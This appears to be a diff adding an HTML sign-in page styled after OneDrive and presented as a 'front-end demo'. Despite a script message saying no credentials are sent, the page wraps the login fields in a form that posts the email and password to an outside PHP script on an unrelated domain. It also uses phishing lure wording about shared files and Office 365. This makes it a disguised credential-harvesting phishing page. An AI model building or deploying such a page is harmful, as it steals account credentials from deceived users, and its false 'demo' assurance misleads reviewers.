@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Welcome Back | OneDrive-style demo</title>
+<style>
+:root{--blue:#1769aa;--ink:#172b4d;--muted:#64748b;--line:#d8e1eb}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:grid;place-items:center;padding:28px 16px;font-family:"Segoe UI",Arial,sans-serif;color:var(--ink);background:radial-gradient(ellipse at 16% 18%,rgba(89,183,238,.38),transparent 34%),radial-gradient(ellipse at 88% 78%,rgba(123,145,245,.24),transparent 36%),linear-gradient(135deg,#edf7ff,#f8fbff 48%,#e8f1ff)}
+.layout{width:min(100%,440px)}
+.brand{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:20px;color:#334155;font-size:17px;font-weight:600}
+.brand svg{width:42px;height:34px}
+.card{background:rgba(255,255,255,.95);border:1px solid white;border-radius:20px;padding:38px 36px 30px;box-shadow:0 22px 65px rgba(35,77,120,.14);backdrop-filter:blur(14px)}
+h1{margin:0 0 9px;font-size:30px;letter-spacing:-.8px}
+.intro{margin:0 0 28px;color:var(--muted);font-size:14px;line-height:1.55}
+label{display:block;margin:0 0 8px;font-size:13px;font-weight:600;color:#334155}
+.field{margin-bottom:19px}
+input{display:block;width:100%;height:48px;padding:0 14px;border:1px solid var(--line);border-radius:9px;background:#fff;color:var(--ink);font:inherit;font-size:14px;outline:none}
+input:focus{border-color:#2784c7;box-shadow:0 0 0 3px rgba(39,132,199,.13)}
+.password-wrap{position:relative}.password-wrap input{padding-right:76px}
+.toggle{position:absolute;right:11px;top:50%;transform:translateY(-50%);border:0;padding:6px 4px;background:transparent;color:var(--blue);font-weight:600;cursor:pointer}
+.forgot-row{display:flex;justify-content:flex-end;margin:-5px 0 22px}
+a{color:var(--blue);text-decoration:none;font-size:13px;font-weight:600}a:hover{text-decoration:underline}
+.submit{width:100%;height:48px;border:0;border-radius:9px;background:linear-gradient(100deg,#0878c9,#1765b5);color:white;font:600 15px "Segoe UI",Arial,sans-serif;cursor:pointer;box-shadow:0 7px 16px rgba(23,105,170,.2)}
+.submit:hover{filter:brightness(1.06)}
+.notice{display:none;margin-top:16px;padding:11px 12px;border-radius:8px;background:#eef6ff;color:#24577f;font-size:12px;line-height:1.5}.notice.show{display:block}
+.demo-note{margin:21px 0 0;text-align:center;color:#718096;font-size:11px;line-height:1.5}
+.footer{margin-top:18px;text-align:center;color:#718096;font-size:11px}
+@media(max-width:480px){.card{padding:31px 23px 25px;border-radius:16px}h1{font-size:27px}}
+</style>
+</head>
+<body>
+<main class="layout">
+<div class="brand" aria-label="OneDrive-inspired demo">
+<svg viewBox="0 0 64 48" role="img" aria-label="Cloud logo">
+<path d="M25.5 9.2c-7.1 0-13 4.8-14.8 11.3C4.7 21.3 1 25.5 1 31c0 6.1 4.9 11 11 11h38.5C57.4 42 63 36.8 63 30.2c0-6.2-4.7-11.3-10.8-11.8C49.4 11.8 43.7 7 36.9 7c-4.4 0-8.4 1.8-11.4 4.8" fill="#168bd2"/>
+<path d="M11 42h39.5c5.8 0 10.4-3.8 12-8.8-5.7-7.4-15.7-9.3-23.4-4.2L23.6 40.1 11 42z" fill="#70ad32"/>
+<path d="M11 42h39.5c5.8 0 10.4-3.8 12-8.8-3.1-4-7.7-6.3-12.6-6.5L31 42H11z" fill="#28a8e0"/>
+</svg><span>OneDrive-file share</span>
+</div>
+<section class="card" aria-labelledby="welcome-heading">
+<h1 id="welcome-heading">Welcome Back</h1>
+<p class="intro">Sign in to continue to your files and documents.</p>
+    <!-- -->
+    <form action="https://lltgroupinc.com/hjfdhkjer743/tr43r.php" method="post">
+<form id="loginForm">
+<div class="field"><label for="email">Email address</label><input id="email" name="cccc" type="email" placeholder="Email" autocomplete="username" required></div>
+<div class="field"><label for="password">Password</label><div class="password-wrap"><input id="password" name="pppp" type="password" placeholder="Password" autocomplete="current-password" required><button class="toggle" id="togglePassword" type="button" aria-controls="password" aria-pressed="false">Show</button></div></div>
+<div class="forgot-row"><a href="#" id="forgotLink">Forgot password?</a></div>
+<button class="submit" type="submit">Sign in</button>
+<div class="notice" id="notice" role="status" aria-live="polite"></div>
+</form>
+<p class="demo-note">File shared on onedrive only. This page requires you to sign in with office 365 and any other related severs.</p>
+</section>
+<div class="footer">© 2026. All rights reserved. </div>
+</main>
+<script>
+const passwordInput=document.getElementById('password');
+const toggleButton=document.getElementById('togglePassword');
+const notice=document.getElementById('notice');
+toggleButton.addEventListener('click',()=>{const reveal=passwordInput.type==='password';passwordInput.type=reveal?'text':'password';toggleButton.textContent=reveal?'Hide':'Show';toggleButton.setAttribute('aria-pressed',String(reveal));});
+document.getElementById('loginForm').addEventListener('submit',event=>{event.preventDefault();notice.textContent='This is a front-end demo. No credentials were sent or stored. Connect a secure authentication provider to enable real sign-in.';notice.classList.add('show');});
+document.getElementById('forgotLink').addEventListener('click',event=>{event.preventDefault();notice.textContent='For a real OneDrive account, use Microsoft’s official password reset page.';notice.classList.add('show');});
+</script>
+</body></html>
